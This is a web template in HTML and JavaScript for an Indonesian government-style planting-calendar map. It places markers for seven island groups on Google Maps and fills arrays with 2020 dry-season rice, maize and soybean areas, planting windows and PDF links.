<div id="loading" style="position:absolute; width:100%; text-align:center; top:60px;"><img src="{{ asset('img/loading_gmap.gif') }}" border=0></div>
<script>
    document.getElementById('loading').style.display = 'none';

</script>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />
    <title>Peta Katam Terpadu dan Dinamik @googlemaps</title>
    <link rel="stylesheet" type="text/css" href="{{ asset('css/style.css') }}" media="all" />
    <script type="text/javascript" src="https://maps.google.com/maps/api/js?libraries=weather&language=id&key=AIzaSyCGaF4tu5Ykxxi9qg2X24QQD7u92E-xx_g">
    </script>
    <script src="https://maptilercdn.s3.amazonaws.com/klokantech.js"></script>
    <script type="text/javascript">
        function addCommas(nStr) {
            nStr += '';
            x = nStr.split(',');
            x1 = x[0];
            x2 = x.length > 1 ? '.' + x[1] : '';
            var rgx = /(\d+)(\d{3})/;
            while (rgx.test(x1)) {
                x1 = x1.replace(rgx, '$1' + '.' + '$2');
            }
            return x1 + x2;
        }

        function initialize() {
            var myOptions = {
                zoom: 4
                , streetViewControl: false
                , tilt: 0
                , scaleControl: true
                , gestureHandling: 'greedy'
                , backgroundColor: '#E5EECF',
                //    labels: true,
                //           mapTypeId: 'hybrid'
            };
            var map = new google.maps.Map(document.getElementById("map")
                , myOptions);

            var places = [];

            var bounds = new google.maps.LatLngBounds();
            var mapBounds = new google.maps.LatLngBounds(
                new google.maps.LatLng(-17.36337353, 91.33988675)
                , new google.maps.LatLng(12.0207112, 144.80898163));
            var mapMinZoom = 2;
            var mapMaxZoom = 12;
            var overlay = new klokantech.MapTilerMapType(map, function(x, y, z) {
                    return "http://202.78.200.23/kml/katam_kml/MK1-TIF/{z}/{x}/{y}.png".replace('{z}', z).replace('{x}', x).replace('{y}', y);
                }
                , mapBounds, mapMinZoom, mapMaxZoom);


            var lat = [];
            var long = [];
            places.push(new google.maps.LatLng(0.303674047, 101.2282335));
            lat[0] = '0.303674047';
            long[0] = '101.2282335';
            places.push(new google.maps.LatLng(-7.371769422, 109.8631074));
            lat[1] = '-7.371769422';
            long[1] = '109.8631074';
            places.push(new google.maps.LatLng(-8.559635673, 118.9091658));
            lat[2] = '-8.559635673';
            long[2] = '118.9091658';
            places.push(new google.maps.LatLng(0.075238229, 113.8378907));
            lat[3] = '0.075238229';
            long[3] = '113.8378907';
            places.push(new google.maps.LatLng(-1.980684129, 120.5995909));
            lat[4] = '-1.980684129';
            long[4] = '120.5995909';
            places.push(new google.maps.LatLng(-1.615186821, 127.7267884));
            lat[5] = '-1.615186821';
            long[5] = '127.7267884';
            places.push(new google.maps.LatLng(-4.08229365, 135.5849805));
            lat[6] = '-4.08229365';
            long[6] = '135.5849805';

            var url_pdf = [];
            var url_bptp = [];
            var url_zoomin = [];
            var url_zoomout = [];
            var id_pulau = [];
            id_pulau[0] = '1';
            id_pulau[1] = '3';
            id_pulau[2] = '5';
            id_pulau[3] = '6';
            id_pulau[4] = '7';
            id_pulau[5] = '8';
            id_pulau[6] = '9';
            var pulau = [];
            pulau[0] = 'SUMATERA';
            pulau[1] = 'JAWA';
            pulau[2] = 'BALI DAN NUSA TENGGARA';
            pulau[3] = 'KALIMANTAN';
            pulau[4] = 'SULAWESI';
            pulau[5] = 'MALUKU';
            pulau[6] = 'PAPUA';
            var tahun_musim = [];
            tahun_musim[0] = 'MK 2020';
            tahun_musim[1] = 'MK 2020';
            tahun_musim[2] = 'MK 2020';
            tahun_musim[3] = 'MK 2020';
            tahun_musim[4] = 'MK 2020';
            tahun_musim[5] = 'MK 2020';
            tahun_musim[6] = 'MK 2020';
            var luas_baku_ha3 = [];
            luas_baku_ha3[0] = '1752308';
            luas_baku_ha3[1] = '3472864';
            luas_baku_ha3[2] = '461038';
            luas_baku_ha3[3] = '723947';
            luas_baku_ha3[4] = '972854';
            luas_baku_ha3[5] = '31826';
            luas_baku_ha3[6] = '45055';
            var MK1_luas_padi_sawah_ha3 = [];
            MK1_luas_padi_sawah_ha3[0] = '1567404';
            MK1_luas_padi_sawah_ha3[1] = '1761887';
            MK1_luas_padi_sawah_ha3[2] = '75674';
            MK1_luas_padi_sawah_ha3[3] = '451293';
            MK1_luas_padi_sawah_ha3[4] = '444541';
            MK1_luas_padi_sawah_ha3[5] = '16961';
            MK1_luas_padi_sawah_ha3[6] = '5162';
            var MK1_luas_jagung_kedelai_ha3 = [];
            MK1_luas_jagung_kedelai_ha3[0] = '123803';
            MK1_luas_jagung_kedelai_ha3[1] = '374182';
            MK1_luas_jagung_kedelai_ha3[2] = '1022';
            MK1_luas_jagung_kedelai_ha3[3] = '14635';
            MK1_luas_jagung_kedelai_ha3[4] = '115720';
            MK1_luas_jagung_kedelai_ha3[5] = '4097';
            MK1_luas_jagung_kedelai_ha3[6] = '0';
            var MK1_luas_kedelai_ha3 = [];
            MK1_luas_kedelai_ha3[0] = '0';
            MK1_luas_kedelai_ha3[1] = '466913';
            MK1_luas_kedelai_ha3[2] = '49284';
            MK1_luas_kedelai_ha3[3] = '0';
            MK1_luas_kedelai_ha3[4] = '124763';
            MK1_luas_kedelai_ha3[5] = '0';
            MK1_luas_kedelai_ha3[6] = '30262';
            var MK2_luas_padi_sawah_ha3 = [];
            MK2_luas_padi_sawah_ha3[0] = '414786';
            MK2_luas_padi_sawah_ha3[1] = '525079';
            MK2_luas_padi_sawah_ha3[2] = '0';
            MK2_luas_padi_sawah_ha3[3] = '0';
            MK2_luas_padi_sawah_ha3[4] = '0';
            MK2_luas_padi_sawah_ha3[5] = '0';
            MK2_luas_padi_sawah_ha3[6] = '0';
            var MK2_luas_jagung_kedelai_ha3 = [];
            MK2_luas_jagung_kedelai_ha3[0] = '414786';
            MK2_luas_jagung_kedelai_ha3[1] = '525079';
            MK2_luas_jagung_kedelai_ha3[2] = '0';
            MK2_luas_jagung_kedelai_ha3[3] = '0';
            MK2_luas_jagung_kedelai_ha3[4] = '0';
            MK2_luas_jagung_kedelai_ha3[5] = '0';
            MK2_luas_jagung_kedelai_ha3[6] = '0';
            var MK2_luas_kedelai_ha3 = [];
            MK2_luas_kedelai_ha3[0] = '52611';
            MK2_luas_kedelai_ha3[1] = '665673';
            MK2_luas_kedelai_ha3[2] = '0';
            MK2_luas_kedelai_ha3[3] = '207178';
            MK2_luas_kedelai_ha3[4] = '438189';
            MK2_luas_kedelai_ha3[5] = '0';
            MK2_luas_kedelai_ha3[6] = '0';
            url_zoomin[0] = 'http://katam.litbang.pertanian.go.id/gmap_dinamis.aspx?id_adm=1&tahun_musim=MK 2020&lang=&kolom=Katam Padi dan Palawija';
            url_pdf[0] = 'http://katam.litbang.pertanian.go.id/katam_terpadu/2020/MK/1/1_tinggi.pdf';
            url_zoomin[1] = 'http://katam.litbang.pertanian.go.id/gmap_dinamis.aspx?id_adm=3&tahun_musim=MK 2020&lang=&kolom=Katam Padi dan Palawija';
            url_pdf[1] = 'http://katam.litbang.pertanian.go.id/katam_terpadu/2020/MK/3/3_tinggi.pdf';
            url_zoomin[2] = 'http://katam.litbang.pertanian.go.id/gmap_dinamis.aspx?id_adm=5&tahun_musim=MK 2020&lang=&kolom=Katam Padi dan Palawija';
            url_pdf[2] = 'http://katam.litbang.pertanian.go.id/katam_terpadu/2020/MK/5/5_tinggi.pdf';
            url_zoomin[3] = 'http://katam.litbang.pertanian.go.id/gmap_dinamis.aspx?id_adm=6&tahun_musim=MK 2020&lang=&kolom=Katam Padi dan Palawija';
            url_pdf[3] = 'http://katam.litbang.pertanian.go.id/katam_terpadu/2020/MK/6/6_tinggi.pdf';
            url_zoomin[4] = 'http://katam.litbang.pertanian.go.id/gmap_dinamis.aspx?id_adm=7&tahun_musim=MK 2020&lang=&kolom=Katam Padi dan Palawija';
            url_pdf[4] = 'http://katam.litbang.pertanian.go.id/katam_terpadu/2020/MK/7/7_tinggi.pdf';
            url_zoomin[5] = 'http://katam.litbang.pertanian.go.id/gmap_dinamis.aspx?id_adm=8&tahun_musim=MK 2020&lang=&kolom=Katam Padi dan Palawija';
            url_pdf[5] = 'http://katam.litbang.pertanian.go.id/katam_terpadu/2020/MK/8/8_tinggi.pdf';
            url_zoomin[6] = 'http://katam.litbang.pertanian.go.id/gmap_dinamis.aspx?id_adm=9&tahun_musim=MK 2020&lang=&kolom=Katam Padi dan Palawija';
            url_pdf[6] = 'http://katam.litbang.pertanian.go.id/katam_terpadu/2020/MK/9/9_tinggi.pdf';

            var MK1_waktu_tanam_padi_sawah = [];
            var MK1_luas_padi_sawah_ha_hitung = [];
            var MK2_waktu_tanam_padi_sawah = [];
            var MK2_luas_padi_sawah_ha_hitung = [];
            MK1_waktu_tanam_padi_sawah['0,0'] = 'MEI III-JUN I';
            MK1_luas_padi_sawah_ha_hitung['0,0'] = '582381';
            MK1_waktu_tanam_padi_sawah['0,1'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['0,1'] = '-';
            MK1_waktu_tanam_padi_sawah['0,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['0,2'] = '-';
            MK1_waktu_tanam_padi_sawah['0,1'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['0,1'] = '217810';
            MK1_waktu_tanam_padi_sawah['0,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['0,2'] = '-';
            MK1_waktu_tanam_padi_sawah['0,2'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['0,2'] = '180372';
            MK1_waktu_tanam_padi_sawah['0,3'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['0,3'] = '110762';
            MK1_waktu_tanam_padi_sawah['0,4'] = 'JUL I-II';
            MK1_luas_padi_sawah_ha_hitung['0,4'] = '104865';
            MK1_waktu_tanam_padi_sawah['0,5'] = 'AGS II-III';
            MK1_luas_padi_sawah_ha_hitung['0,5'] = '90792';
            MK1_waktu_tanam_padi_sawah['0,6'] = 'MEI III-JUN I';
            MK1_luas_padi_sawah_ha_hitung['0,6'] = '69344';
            MK1_waktu_tanam_padi_sawah['0,7'] = 'JUL III-AGS I';
            MK1_luas_padi_sawah_ha_hitung['0,7'] = '52042';
            MK1_waktu_tanam_padi_sawah['0,8'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['0,8'] = '50314';
            MK1_waktu_tanam_padi_sawah['0,9'] = 'MEI I-II';
            MK1_luas_padi_sawah_ha_hitung['0,9'] = '49381';
            MK1_waktu_tanam_padi_sawah['0,10'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['0,10'] = '25088';
            MK1_waktu_tanam_padi_sawah['0,11'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['0,11'] = '12637';
            MK1_waktu_tanam_padi_sawah['0,12'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['0,12'] = '7083';
            MK1_waktu_tanam_padi_sawah['0,13'] = 'JUL I-II';
            MK1_luas_padi_sawah_ha_hitung['0,13'] = '5238';
            MK1_waktu_tanam_padi_sawah['0,14'] = 'AGS II-III';
            MK1_luas_padi_sawah_ha_hitung['0,14'] = '4473';
            MK1_waktu_tanam_padi_sawah['0,15'] = 'MEI I-II';
            MK1_luas_padi_sawah_ha_hitung['0,15'] = '2433';
            MK1_waktu_tanam_padi_sawah['0,16'] = 'MEI I-II';
            MK1_luas_padi_sawah_ha_hitung['0,16'] = '2236';
            MK1_waktu_tanam_padi_sawah['0,17'] = 'SEP I-II';
            MK1_luas_padi_sawah_ha_hitung['0,17'] = '153';
            MK1_waktu_tanam_padi_sawah['0,18'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['0,18'] = '0';
            MK1_waktu_tanam_padi_sawah['0,19'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['0,19'] = '0';
            MK1_waktu_tanam_padi_sawah['0,20'] = 'TIDAK ADA SAWAH';
            MK1_luas_padi_sawah_ha_hitung['0,20'] = '0';
            MK2_waktu_tanam_padi_sawah['0,0'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['0,0'] = '194898';
            MK2_waktu_tanam_padi_sawah['0,1'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['0,1'] = '-';
            MK2_waktu_tanam_padi_sawah['0,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['0,2'] = '-';
            MK2_waktu_tanam_padi_sawah['0,1'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['0,1'] = '143385';
            MK2_waktu_tanam_padi_sawah['0,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['0,2'] = '-';
            MK2_waktu_tanam_padi_sawah['0,2'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['0,2'] = '33901';
            MK2_waktu_tanam_padi_sawah['0,3'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['0,3'] = '20898';
            MK2_waktu_tanam_padi_sawah['0,4'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['0,4'] = '7607';
            MK2_waktu_tanam_padi_sawah['0,5'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['0,5'] = '4613';
            MK2_waktu_tanam_padi_sawah['0,6'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['0,6'] = '4353';
            MK2_waktu_tanam_padi_sawah['0,7'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['0,7'] = '3610';
            MK2_waktu_tanam_padi_sawah['0,8'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['0,8'] = '1521';
            MK2_waktu_tanam_padi_sawah['0,9'] = 'TIDAK ADA SAWAH';
            MK2_luas_padi_sawah_ha_hitung['0,9'] = '0';
            MK2_waktu_tanam_padi_sawah['0,10'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['0,10'] = '0';
            MK2_waktu_tanam_padi_sawah['0,11'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['0,11'] = '0';
            MK2_waktu_tanam_padi_sawah['0,12'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['0,12'] = '0';
            MK2_waktu_tanam_padi_sawah['0,13'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['0,13'] = '0';
            MK2_waktu_tanam_padi_sawah['0,14'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['0,14'] = '0';
            MK2_waktu_tanam_padi_sawah['0,15'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['0,15'] = '0';
            MK2_waktu_tanam_padi_sawah['0,16'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['0,16'] = '0';
            MK2_waktu_tanam_padi_sawah['0,17'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['0,17'] = '0';
            MK2_waktu_tanam_padi_sawah['0,18'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['0,18'] = '0';
            MK2_waktu_tanam_padi_sawah['0,19'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['0,19'] = '0';
            MK2_waktu_tanam_padi_sawah['0,20'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['0,20'] = '0';
            MK1_waktu_tanam_padi_sawah['1,0'] = 'MEI III-JUN I';
            MK1_luas_padi_sawah_ha_hitung['1,0'] = '377411';
            MK1_waktu_tanam_padi_sawah['1,1'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['1,1'] = '-';
            MK1_waktu_tanam_padi_sawah['1,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['1,2'] = '-';
            MK1_waktu_tanam_padi_sawah['1,1'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['1,1'] = '235816';
            MK1_waktu_tanam_padi_sawah['1,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['1,2'] = '-';
            MK1_waktu_tanam_padi_sawah['1,2'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['1,2'] = '217367';
            MK1_waktu_tanam_padi_sawah['1,3'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['1,3'] = '182751';
            MK1_waktu_tanam_padi_sawah['1,4'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['1,4'] = '177830';
            MK1_waktu_tanam_padi_sawah['1,5'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['1,5'] = '160498';
            MK1_waktu_tanam_padi_sawah['1,6'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['1,6'] = '143423';
            MK1_waktu_tanam_padi_sawah['1,7'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['1,7'] = '48786';
            MK1_waktu_tanam_padi_sawah['1,8'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['1,8'] = '33554';
            MK1_waktu_tanam_padi_sawah['1,9'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['1,9'] = '26972';
            MK1_waktu_tanam_padi_sawah['1,10'] = 'MEI I-II';
            MK1_luas_padi_sawah_ha_hitung['1,10'] = '25996';
            MK1_waktu_tanam_padi_sawah['1,11'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['1,11'] = '23847';
            MK1_waktu_tanam_padi_sawah['1,12'] = 'JUL I-II';
            MK1_luas_padi_sawah_ha_hitung['1,12'] = '21389';
            MK1_waktu_tanam_padi_sawah['1,13'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['1,13'] = '17804';
            MK1_waktu_tanam_padi_sawah['1,14'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['1,14'] = '16222';
            MK1_waktu_tanam_padi_sawah['1,15'] = 'APR II-III';
            MK1_luas_padi_sawah_ha_hitung['1,15'] = '14866';
            MK1_waktu_tanam_padi_sawah['1,16'] = 'SEP I-II';
            MK1_luas_padi_sawah_ha_hitung['1,16'] = '8768';
            MK1_waktu_tanam_padi_sawah['1,17'] = 'MEI III-JUN I';
            MK1_luas_padi_sawah_ha_hitung['1,17'] = '7498';
            MK1_waktu_tanam_padi_sawah['1,18'] = 'MEI I-II';
            MK1_luas_padi_sawah_ha_hitung['1,18'] = '6994';
            MK1_waktu_tanam_padi_sawah['1,19'] = 'SEP I-II';
            MK1_luas_padi_sawah_ha_hitung['1,19'] = '3247';
            MK1_waktu_tanam_padi_sawah['1,20'] = 'AGS II-III';
            MK1_luas_padi_sawah_ha_hitung['1,20'] = '3171';
            MK1_waktu_tanam_padi_sawah['1,21'] = 'MAR III-APR I';
            MK1_luas_padi_sawah_ha_hitung['1,21'] = '2206';
            MK1_waktu_tanam_padi_sawah['1,22'] = 'JUL I-II';
            MK1_luas_padi_sawah_ha_hitung['1,22'] = '2168';
            MK1_waktu_tanam_padi_sawah['1,23'] = 'MEI I-II';
            MK1_luas_padi_sawah_ha_hitung['1,23'] = '1870';
            MK1_waktu_tanam_padi_sawah['1,24'] = 'AGS II-III';
            MK1_luas_padi_sawah_ha_hitung['1,24'] = '1433';
            MK1_waktu_tanam_padi_sawah['1,25'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,25'] = '0';
            MK1_waktu_tanam_padi_sawah['1,26'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,26'] = '0';
            MK1_waktu_tanam_padi_sawah['1,27'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,27'] = '0';
            MK1_waktu_tanam_padi_sawah['1,28'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,28'] = '0';
            MK1_waktu_tanam_padi_sawah['1,29'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,29'] = '0';
            MK1_waktu_tanam_padi_sawah['1,30'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,30'] = '0';
            MK1_waktu_tanam_padi_sawah['1,31'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,31'] = '0';
            MK1_waktu_tanam_padi_sawah['1,32'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,32'] = '0';
            MK1_waktu_tanam_padi_sawah['1,33'] = 'TIDAK ADA SAWAH';
            MK1_luas_padi_sawah_ha_hitung['1,33'] = '0';
            MK1_waktu_tanam_padi_sawah['1,34'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,34'] = '0';
            MK1_waktu_tanam_padi_sawah['1,35'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,35'] = '0';
            MK1_waktu_tanam_padi_sawah['1,36'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,36'] = '0';
            MK1_waktu_tanam_padi_sawah['1,37'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,37'] = '0';
            MK1_waktu_tanam_padi_sawah['1,38'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,38'] = '0';
            MK1_waktu_tanam_padi_sawah['1,39'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['1,39'] = '0';
            MK1_waktu_tanam_padi_sawah['1,40'] = 'BERA';
            MK1_luas_padi_sawah_ha_hitung['1,40'] = '0';
            MK1_waktu_tanam_padi_sawah['1,41'] = 'BERA';
            MK1_luas_padi_sawah_ha_hitung['1,41'] = '0';
            MK1_waktu_tanam_padi_sawah['1,42'] = 'BERA';
            MK1_luas_padi_sawah_ha_hitung['1,42'] = '0';
            MK2_waktu_tanam_padi_sawah['1,0'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['1,0'] = '99153';
            MK2_waktu_tanam_padi_sawah['1,1'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['1,1'] = '-';
            MK2_waktu_tanam_padi_sawah['1,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['1,2'] = '-';
            MK2_waktu_tanam_padi_sawah['1,1'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['1,1'] = '90754';
            MK2_waktu_tanam_padi_sawah['1,2'] = 'Tidak Ada Data';
            MK2_luas_padi_sawah_ha_hitung['1,2'] = '-';
            MK2_waktu_tanam_padi_sawah['1,2'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['1,2'] = '83374';
            MK2_waktu_tanam_padi_sawah['1,3'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['1,3'] = '75022';
            MK2_waktu_tanam_padi_sawah['1,4'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['1,4'] = '61744';
            MK2_waktu_tanam_padi_sawah['1,5'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['1,5'] = '57910';
            MK2_waktu_tanam_padi_sawah['1,6'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['1,6'] = '22373';
            MK2_waktu_tanam_padi_sawah['1,7'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['1,7'] = '14091';
            MK2_waktu_tanam_padi_sawah['1,8'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['1,8'] = '11161';
            MK2_waktu_tanam_padi_sawah['1,9'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['1,9'] = '3742';
            MK2_waktu_tanam_padi_sawah['1,10'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['1,10'] = '2675';
            MK2_waktu_tanam_padi_sawah['1,11'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['1,11'] = '1768';
            MK2_waktu_tanam_padi_sawah['1,12'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['1,12'] = '1044';
            MK2_waktu_tanam_padi_sawah['1,13'] = 'JUL III-AGS I';
            MK2_luas_padi_sawah_ha_hitung['1,13'] = '268';
            MK2_waktu_tanam_padi_sawah['1,14'] = 'SEP I-II';
            MK2_luas_padi_sawah_ha_hitung['1,14'] = '0';
            MK2_waktu_tanam_padi_sawah['1,15'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['1,15'] = '0';
            MK2_waktu_tanam_padi_sawah['1,16'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['1,16'] = '0';
            MK2_waktu_tanam_padi_sawah['1,17'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['1,17'] = '0';
            MK2_waktu_tanam_padi_sawah['1,18'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['1,18'] = '0';
            MK2_waktu_tanam_padi_sawah['1,19'] = 'TIDAK ADA SAWAH';
            MK2_luas_padi_sawah_ha_hitung['1,19'] = '0';
            MK2_waktu_tanam_padi_sawah['1,20'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,20'] = '0';
            MK2_waktu_tanam_padi_sawah['1,21'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,21'] = '0';
            MK2_waktu_tanam_padi_sawah['1,22'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,22'] = '0';
            MK2_waktu_tanam_padi_sawah['1,23'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,23'] = '0';
            MK2_waktu_tanam_padi_sawah['1,24'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['1,24'] = '0';
            MK2_waktu_tanam_padi_sawah['1,25'] = 'AGS II-III';
            MK2_luas_padi_sawah_ha_hitung['1,25'] = '0';
            MK2_waktu_tanam_padi_sawah['1,26'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,26'] = '0';
            MK2_waktu_tanam_padi_sawah['1,27'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,27'] = '0';
            MK2_waktu_tanam_padi_sawah['1,28'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,28'] = '0';
            MK2_waktu_tanam_padi_sawah['1,29'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,29'] = '0';
            MK2_waktu_tanam_padi_sawah['1,30'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,30'] = '0';
            MK2_waktu_tanam_padi_sawah['1,31'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,31'] = '0';
            MK2_waktu_tanam_padi_sawah['1,32'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['1,32'] = '0';
            MK2_waktu_tanam_padi_sawah['1,33'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['1,33'] = '0';
            MK2_waktu_tanam_padi_sawah['1,34'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['1,34'] = '0';
            MK2_waktu_tanam_padi_sawah['1,35'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['1,35'] = '0';
            MK2_waktu_tanam_padi_sawah['1,36'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,36'] = '0';
            MK2_waktu_tanam_padi_sawah['1,37'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['1,37'] = '0';
            MK2_waktu_tanam_padi_sawah['1,38'] = 'SESUAI PALAWIJA';
            MK2_luas_padi_sawah_ha_hitung['1,38'] = '0';
            MK2_waktu_tanam_padi_sawah['1,39'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,39'] = '0';
            MK2_waktu_tanam_padi_sawah['1,40'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,40'] = '0';
            MK2_waktu_tanam_padi_sawah['1,41'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,41'] = '0';
            MK2_waktu_tanam_padi_sawah['1,42'] = 'BERA';
            MK2_luas_padi_sawah_ha_hitung['1,42'] = '0';
            MK1_waktu_tanam_padi_sawah['2,0'] = 'JUN II-III';
            MK1_luas_padi_sawah_ha_hitung['2,0'] = '65042';
            MK1_waktu_tanam_padi_sawah['2,1'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['2,1'] = '-';
            MK1_waktu_tanam_padi_sawah['2,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['2,2'] = '-';
            MK1_waktu_tanam_padi_sawah['2,1'] = 'MEI III-JUN I';
            MK1_luas_padi_sawah_ha_hitung['2,1'] = '9648';
            MK1_waktu_tanam_padi_sawah['2,2'] = 'Tidak Ada Data';
            MK1_luas_padi_sawah_ha_hitung['2,2'] = '-';
            MK1_waktu_tanam_padi_sawah['2,2'] = 'SEP I-II';
            MK1_luas_padi_sawah_ha_hitung['2,2'] = '984';
            MK1_waktu_tanam_padi_sawah['2,3'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['2,3'] = '0';
            MK1_waktu_tanam_padi_sawah['2,4'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['2,4'] = '0';
            MK1_waktu_tanam_padi_sawah['2,5'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['2,5'] = '0';
            MK1_waktu_tanam_padi_sawah['2,6'] = 'SESUAI PALAWIJA';
            MK1_luas_padi_sawah_ha_hitung['2,6'] = '0';
            MK1_waktu_tanam_padi_sawah['2,7'] = 'TIDAK ADA SAWAH';
            MK1_luas_padi_sawah_ha_hitung['2,7'] = '0';
            MK1_waktu_tanam_padi_sawah['2,8'] = 'BERA';
            MK1_luas_padi_sawah_ha_hitung['2,8'] = '0';
